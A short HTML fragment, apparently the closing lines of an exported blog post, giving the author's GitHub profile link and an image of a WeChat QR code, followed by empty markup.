<li class="graf graf--p">My GitHub: <a class="markup--anchor markup--p-anchor" href="https://github.com/OlivierLaflamme" target="_blank" rel="noopener nofollow noopener" data-href="https://github.com/OlivierLaflamme">https://github.com/OlivierLaflamme</a></li>
<li class="graf graf--p">My WeChat QR below:</li>
</ul><figure id="bkmrk--20" class="graf graf--figure graf--layoutOutsetLeft"><img class="graf-image" src="https://cdn-images-1.medium.com/max/750/0*Jh0zrZrfyn8WjkDn.png" data-image-id="0*Jh0zrZrfyn8WjkDn.png" data-width="142" data-height="144"></figure><div id="bkmrk--21">
<div>
<div></div>
</div>
</div>
<div id="bkmrk--22">
<div>
<div></div>
</div>
</div>
<p id="bkmrk-%C2%A0-7"> </p>
<p id="bkmrk-%C2%A0-8"> </p>
<p id="bkmrk-%C2%A0-9"> </p>
